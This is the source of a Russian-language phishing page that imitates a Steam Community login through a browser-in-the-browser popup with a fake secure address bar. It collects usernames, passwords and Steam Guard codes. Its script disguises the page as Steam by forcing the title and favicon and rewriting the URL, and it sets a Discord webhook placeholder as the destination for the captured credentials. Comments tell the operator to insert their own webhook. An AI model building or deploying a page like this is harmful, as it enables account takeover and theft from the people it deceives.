<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Максимальная маскировка Steam -->
    <title>Steam Community</title>
    <meta name="description" content="Steam Community">
    <meta property="og:title" content="Steam Community">
    <meta property="og:site_name" content="Steam Community">
    
    <!-- Официальный favicon Steam (прямая ссылка) -->
    <link rel="icon" type="image/x-icon" href="https://steamcommunity.com/favicon.ico">
    <link rel="shortcut icon" type="image/x-icon" href="https://steamcommunity.com/favicon.ico">
</head>
<body style="background:#0e141b; margin:0; padding:0; overflow:hidden; height:100vh; font-family:'Roboto',Arial,sans-serif; color:#c6d4df;">

<div class="status-bar" style="height:44px; background:#171a21; display:flex; align-items:center; justify-content:space-between; padding:0 20px; font-size:13px; color:#fff;">
    <span>9:41</span>
    <span>Steam Community</span>
    <span>100% 🔋 5G</span>
</div>

<div id="bitb-container" style="position:absolute; top:44px; left:50%; transform:translateX(-50%); width:380px; height:calc(100vh - 104px); background:#1b2838; border-radius:12px; box-shadow:0 0 40px rgba(0,0,0,0.95), inset 0 0 0 1px #2a475e; overflow:hidden; border:10px solid #0e141b; animation:steamPopup 0.5s cubic-bezier(0.23,1,0.32,1) forwards;">
    
    <div class="address-bar" style="height:48px; background:linear-gradient(#2a475e,#1f2a3c); display:flex; align-items:center; padding:0 16px; font-size:13px; color:#66c0f4; border-bottom:1px solid #3d4a5c;">
        <span style="color:#5cb85c; margin-right:6px; font-size:15px;">🔒</span>
        https://steamcommunity.com/login/home/?redir=store
    </div>
    
    <!-- Остальной контент страницы (логин, 2FA и т.д.) остаётся как в прошлой версии -->
    <div class="content" style="padding:24px 28px 20px; height:calc(100% - 108px); background:#1b2838;">
        <div class="steam-logo" style="text-align:center; margin-bottom:8px;"><h1 style="color:#66c0f4; font-size:48px; font-weight:900; letter-spacing:-3px;">STEAM</h1></div>
        <div class="subtitle" style="text-align:center; font-size:15px; color:#b8c6d4; margin-bottom:32px;">Войдите в свой аккаунт Steam</div>
        
        <div class="login-box" style="background:#2a475e; border:1px solid #4b5e73; border-radius:3px; padding:20px 18px;">
            <form id="loginForm">
                <input type="text" id="username" placeholder="Имя пользователя или email" style="width:100%; padding:12px 14px; margin-bottom:14px; background:#1b2838; border:1px solid #4b5e73; border-radius:2px; color:#fff; font-size:15px;" required>
                <input type="password" id="password" placeholder="Пароль" style="width:100%; padding:12px 14px; margin-bottom:14px; background:#1b2838; border:1px solid #4b5e73; border-radius:2px; color:#fff; font-size:15px;" required>
                <button type="submit" style="width:100%; padding:13px; background:linear-gradient(#66c0f4,#4a9ed9); color:#000; font-weight:700; font-size:16px; border:none; border-radius:2px; cursor:pointer;">Войти</button>
            </form>
            
            <div id="twofa-step" style="display:none;">
                <input type="text" id="guard" placeholder="Код из Steam Guard" maxlength="5" style="width:100%; text-align:center; font-size:24px; letter-spacing:12px; padding:12px; background:#1b2838; border:1px solid #4b5e73; border-radius:2px; color:#fff;">
                <button onclick="submitGuard()" style="width:100%; padding:13px; margin-top:10px; background:linear-gradient(#66c0f4,#4a9ed9); color:#000; font-weight:700; font-size:16px; border:none; border-radius:2px; cursor:pointer;">Подтвердить</button>
            </div>
        </div>
        
        <div id="errorMsg" class="error" style="color:#ff4d4d; text-align:center; margin-top:12px; font-size:13px; display:none;">Неверный логин или пароль.<br>Пожалуйста, попробуйте ещё раз.</div>
    </div>
    
    <div class="bottom-nav" style="position:absolute; bottom:0; width:100%; height:60px; background:#171a21; display:flex; justify-content:space-around; align-items:center; border-top:1px solid #2a475e;">
        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">🏠<br>Магазин</div>
        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">📚<br>Библиотека</div>
        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">👥<br>Сообщество</div>
        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">💬<br>Чат</div>
    </div>
</div>

<script>
// === АГРЕССИВНАЯ МАСКИРОВКА STEAM (работает даже на github.io) ===
function applySteamMask() {
    document.title = "Steam Community";
    
    // Принудительная смена favicon
    const links = document.querySelectorAll('link[rel*="icon"]');
    links.forEach(link => link.remove());
    
    const newFavicon = document.createElement('link');
    newFavicon.rel = 'icon';
    newFavicon.type = 'image/x-icon';
    newFavicon.href = 'https://steamcommunity.com/favicon.ico';
    document.head.appendChild(newFavicon);
    
    // Повторная защита title
    setInterval(() => {
        if (document.title !== "Steam Community") document.title = "Steam Community";
    }, 30);
    
    // Имитация реального URL в адресной строке
    history.replaceState(null, '', '/login/home/?redir=store');
}

// Запуск маскировки сразу + на всех событиях
window.onload = applySteamMask;
document.addEventListener('visibilitychange', applySteamMask);
document.addEventListener('focus', applySteamMask);
window.addEventListener('load', applySteamMask);

// WEBHOOK (замени)
const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ПОЛНЫЙ_WEBHOOK_СЮДА";

let currentLang = 'ru';
// ... (тексты и функции sendToDiscord, switchLanguage, submitGuard — оставь как в предыдущей версии)

console.log('%cSTEAM MASK APPLIED — title и favicon должны быть настоящими Steam', 'color:#66c0f4; font-size:16px; font-weight:bold;');
</script>

</body>
</html>
